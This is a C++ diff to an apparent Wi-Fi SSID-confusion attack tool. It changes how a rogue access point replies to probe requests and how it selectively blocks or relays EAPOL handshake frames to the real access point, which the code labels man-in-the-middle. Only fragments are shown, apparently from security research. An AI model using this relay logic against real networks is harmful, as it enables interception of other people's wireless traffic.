@@ -28,8 +28,8 @@ FrameProcess SsidConfusion::handle_probe(const HWAddress<6> addr2, const PDU *pd
 
 		const unique_ptr<Dot11ProbeResponse> resp(probe_resp->clone());
 		resp->addr1(addr2);
-		send_to_rogue(*resp);
-
+		send_to_rogue(*resp); // all, because MAC randomization
+		//client_state.update_state(ClientState::Finding);
 		display_traffic(*pdu, "Rogue channel", " -- Replied");
 		return STOP;
 	}
@@ -59,19 +59,14 @@ FrameProcess SsidConfusion::handle_open_auth(const HWAddress<6> &addr2, Dot11 &d
 	return CONTINUE;
 }
 
-FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr1, const HWAddress<6> addr2, PDU &pdu) const {
+FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr1, const HWAddress<6> addr2, const PDU &pdu, const vector<uint8_t> &raw) const {
 	// EAPOL STA -> AP
-	if(addr1 == rogue_ap.get(SK::mac) && addr2 == sta.get(SK::mac) && is_eapol(pdu)) {
-		int eapol_msg = get_eapol_msg_num(pdu);
-		log(LogLevel::DEBUG, "Rogue channel: EAPOL {} detected, addr1={}, addr2={}",
-			eapol_msg, addr1, addr2);
-
-		if(eapol_msg == 2 || eapol_msg == 4) {
-			log(LogLevel::INFO, "Rogue channel: EAPOL {} from STA -> AP", eapol_msg);
-			const vector<uint8_t> raw = pdu.serialize();
-			send_to_real(raw);
-			return STOP;
-		}
+	if(addr2 == sta.get(SK::mac) && is_eapol(pdu)) {
+		const int msg = get_eapol_msg_num(pdu);
+		if(msg == 1 || msg == 3) return STOP; //block cycles
+		if(msg != -1) return CONTINUE;
+		display_traffic(pdu, "Rogue channel", " STA -> AP  -- MitM'ing");
+		send_to_real(raw);
 		return STOP;
 	}
 	return CONTINUE;
